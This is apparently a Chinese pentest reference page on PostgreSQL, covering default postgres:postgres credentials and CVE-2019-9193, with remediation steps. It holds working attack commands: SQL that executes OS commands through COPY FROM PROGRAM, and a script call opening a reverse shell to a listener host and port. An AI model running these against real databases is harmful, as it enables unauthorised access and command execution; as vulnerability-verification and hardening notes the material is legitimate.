# PostgreSQL
PostgreSQL是一个流行的开源关系数据库，默认端口5432
## 弱口令漏洞
### 漏洞说明
postgresql默认账户为 postgres:postgres
### 涉及范围
/
### 验证方法
msfconole:
`auxiliary/scanner/postgres/postgres_login`
pocsuite:
`poc_postgresql_weakpass.py`
python(parrot):
python parrot.py


## 后台命令执行漏洞 CVE-2019-9193
### 漏洞说明
PostgreSQL其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。
### 涉及范围
9.3到11

### 验证方法
**手动验证**
```sql
# 登录到postgresql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```
**脚本**
other/cve-2019-9193.py

`python CVE-2019-9193.py -u 127.0.0.1 --lhost 10.37.129.2 --lport 4444`

**msfconsole**
multi/postgres/postgres_copy_from_program_cmd_exec

### 修复措施

**临时修复措施**

取消用户关于pg_read_server_files、pg_write_server_files、pg_execute_server_program的权限

**正式修复措施**

升级postgresql至11以上